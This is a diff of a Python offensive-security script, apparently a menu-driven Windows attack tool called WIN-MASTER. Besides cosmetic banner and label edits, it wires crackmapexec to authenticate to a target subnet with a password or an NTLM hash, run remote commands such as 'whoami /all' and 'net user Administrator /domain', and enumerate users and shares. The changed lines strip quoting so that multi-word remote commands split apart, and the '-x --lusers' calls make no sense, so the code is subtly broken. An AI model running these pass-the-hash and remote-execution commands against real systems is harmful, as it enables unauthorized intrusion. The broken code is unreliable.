@@ -179,11 +179,11 @@ def privCheck():
 
 def keys():
    print("")
-   print("   HKEY_CLASSES_ROOT	\tHKCR")
-   print("   HKEY_CURRENT_USER	\tHKCU")
-   print("   HKEY_LOCAL_MACHINE	\tHKLM")
-   print("   HKEY_USERS		\tHKU")
-   print("   HKEY_CURRENT_CONFIG\tHKCC")
+   print("   HKEY_CLASSES_ROOT	 \tHKCR")
+   print("   HKEY_CURRENT_USER	 \tHKCU")
+   print("   HKEY_LOCAL_MACHINE	 \tHKLM")
+   print("   HKEY_USERS		 \tHKU")
+   print("   HKEY_CURRENT_CONFIG\t\tHKCC")
    return
 
 def display():
@@ -479,13 +479,13 @@ def options():
 command("clear")
 command("xdotool key Alt+Shift+S; xdotool type 'WIN-MASTER'; xdotool key Return")
 
-print("__        _____ _   _       __  __    _    ____ _____ _____ ____  ")
-print("\ \      / /_ _| \ | |     |  \/  |  / \  / ___|_   _| ____|  _ \ ")
-print(" \ \ /\ / / | ||  \| |_____| |\/| | / _ \ \___ \ | | |  _| | |_) |")
-print("  \ V  V /  | || |\  |_____| |  | |/ ___ \ ___) || | | |___|  _ < ")
-print("   \_/\_/  |___|_| \_|     |_|  |_/_/   \_\____/ |_| |_____|_| \_\\")
-print("                                                                  ")
-print("        BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)      ")
+print("__        _____ _   _   __  __    _    ____ _____ _____ ____  ")
+print("\ \      / /_ _| \ | | |  \/  |  / \  / ___|_   _| ____|  _ \ ")
+print(" \ \ /\ / / | ||  \| | | |\/| | / _ \ \___ \ | | |  _| | |_) |")
+print("  \ V  V /  | || |\  | | |  | |/ ___ \ ___) || | | |___|  _ < ")
+print("   \_/\_/  |___|_| \_| |_|  |_/_/   \_\____/ |_| |_____|_| \_\\")
+print("                                                              ")
+print("        BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)  ")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -2294,15 +2294,15 @@ while True:
             command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
          
             print("\n[+] Trying specified windows command...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /all'")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x whoami /all")
 
             print("\n[+] Trying to enumerate users and shares...\n")  
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares")
          
             print("\n[+] Trying a few other command while I am here...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'net user Administrator /domain'")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x '--lusers")         
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x net user Administrator /domain")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x --lusers")         
          else:
             print("[i] Using HASH value as password credential")
             print("[*] Enumerating, please wait...")          
@@ -2310,15 +2310,15 @@ while True:
             command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
          
             print("\n[+] Trying specified windows command...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -x 'whoami /all'")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -x whoami /all")
 
             print("\n[+] Trying to enumerate users and shares...\n")  
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --users")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --shares")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --shares")
          
             print("\n[+] Trying a few other command while I am here...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -x 'net user Administrator /domain'")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -x '--lusers'")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -x net user Administrator /domain")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -x --lusers")
             
       prompt()
 
